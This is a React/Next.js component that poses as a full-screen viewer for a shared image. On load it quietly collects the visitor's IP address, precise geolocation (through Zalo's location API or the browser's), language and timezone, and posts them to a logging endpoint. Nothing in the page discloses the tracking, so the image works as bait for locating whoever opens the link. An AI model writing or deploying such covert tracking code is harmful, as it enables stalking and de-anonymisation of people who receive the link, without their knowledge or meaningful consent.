'use client';

import { useEffect } from 'react';
import Image from 'next/image';

interface ImageRedirectClientProps {
  imageUrl: string;
}

export function ImageRedirectClient({ imageUrl }: ImageRedirectClientProps) {

  useEffect(() => {
    const logLocation = async () => {
      let clientIp = 'N/A';
      try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        if (ipResponse.ok) {
          const ipData = await ipResponse.json();
          clientIp = ipData.ip;
        }
      } catch (e) {
        console.error("Could not fetch IP", e);
      }

      const sendLog = (pos?: { coords: { latitude: number; longitude: number; accuracy: number; } }) => {
        const body: any = { 
            ip: clientIp, 
            from: 'image',
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        };
        
        if (pos) {
            body.lat = pos.coords.latitude;
            body.lon = pos.coords.longitude;
            body.acc = pos.coords.accuracy;
        }

        // Fire-and-forget request to log the data.
        fetch('/api/log-location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body),
            keepalive: true, 
        });
      };

      const handleError = () => {
        // If permission is denied or there's an error, log without location data.
        sendLog();
      };

      // Check for Zalo's specific JS API first for better accuracy on that platform.
      if (typeof (window as any).zaloJSV2?.getLocation === 'function') {
        (window as any).zaloJSV2.getLocation((data: { status: string; latitude: number; longitude: number; accuracy: number; }) => {
          if (data.status === "SUCCESS" && data.latitude && data.longitude) {
            sendLog({
              coords: {
                latitude: data.latitude,
                longitude: data.longitude,
                accuracy: data.accuracy || 15,
              },
            });
          } else {
            handleError();
          }
        });
      } else if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          sendLog,
          handleError,
          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
        );
      } else {
        // Fallback for browsers without geolocation support.
        handleError();
      }
    };
    
    // Attempt to log the location when the component mounts.
    logLocation();

  }, []); // Empty dependency array ensures this runs only once.

  return (
    <div style={{
      position: 'fixed',
      inset: 0,
      width: '100vw',
      height: '100vh',
      backgroundColor: '#000',
    }}>
      <Image
        src={imageUrl}
        alt="Hình ảnh được chia sẻ" // A more descriptive alt text
        layout="fill"
        objectFit="contain"
        priority
      />
    </div>
  );
}
